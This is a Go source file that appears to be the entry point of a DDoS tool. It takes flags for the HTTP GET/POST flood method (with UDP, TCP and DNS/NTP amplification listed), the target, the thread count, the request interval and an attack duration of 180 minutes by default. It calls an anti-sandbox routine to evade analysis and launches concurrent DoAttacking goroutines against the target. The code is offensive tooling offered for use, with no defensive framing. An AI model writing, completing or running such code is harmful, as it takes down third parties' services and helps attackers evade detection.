package main

import (
	"flag"
	"log"
	"os"
	"runtime"
	"time"
)

// X args
var (
	AppName   string
	BuiltAt   string
	GoVersion string
	GitAuthor string
	GitCommit string
	Version   string = "dev"
)

// Main Function / 主函数
func main() {
	protectMain() // Anti-Sandbox
	runtime.GC()  // Clean up memory to prevent memory overflow
	// Parse Flags / 解析命令行参数
	printVersion := flag.Bool("v", false, "Print version and exit")
	flag.IntVar(&Method, "m", 0, "DDoS Method (GET:0 POST:1 UDP:2 TCP:3 DNS_AMP:4 NTP_AMP:5)")
	flag.StringVar(&Target, "t", "null", "Target (For Layer 4 Attack)")
	flag.IntVar(&ConcurrencyCount, "cc", 100, "Number of concurrent threads")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "Frequency of attacks per thread(ms)")
	flag.IntVar(&DurationMinute, "dm", 180, "Attack Duration time(min)")
	flag.Parse()
	if *printVersion {
		printVer()
		os.Exit(0)
	} else {
		printWelcome()
	}
	if Method == 0 {
		tmpMethod = "GET"
	} else if Method == 1 {
		tmpMethod = "POST"
	} else {
		log.Println("L4 Support is Coming Soon...")
		os.Exit(1)
	}
	go func() {
		if Target != "null" {
			for i := 0; i < ConcurrencyCount; i++ {
				go DoAttacking(i)
			}
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
	os.Exit(0) // Exit with code 0
}
